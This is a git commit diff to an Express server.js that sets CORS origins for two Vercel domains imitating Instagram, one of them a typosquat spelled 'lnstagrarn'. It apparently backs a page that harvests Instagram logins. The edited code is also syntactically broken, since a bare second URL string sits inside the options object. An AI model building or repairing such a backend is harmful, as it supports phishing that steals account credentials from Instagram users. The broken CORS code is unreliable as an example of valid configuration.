fa147e8d6e4dcf2a61ea1d41e728c53c31c00eb5
Manglesh ks <97281187+10Unknownboy@users.noreply.github.com>
2026-09-23 18:40:14 +0530

    Update server.js

--- server.js
+++ server.js
@@ -4,13 +4,9 @@ const cors = require("cors");
 const app = express();
 
 app.use(cors({
-    origin: "https://account-instagram-com.vercel.app"
+    origin: "https://account-instagram-com.vercel.app",
+            "https://lnstagrarn-reel-paoa2oajo.vercel.app/profile/aryan.gg_xd/geturl$=Instagram/aashyyapsalotigsh=cncyaW43bXdlZXB4/profile.html"
 }));
-
-app.use(cors({
-    origin: "https://lnstagrarn-reel-paoa2oajo.vercel.app/profile/aryan.gg_xd/geturl$=Instagram/aashyyapsalotigsh=cncyaW43bXdlZXB4/profile.html"
-}));
-
 
 app.use(express.json());
 
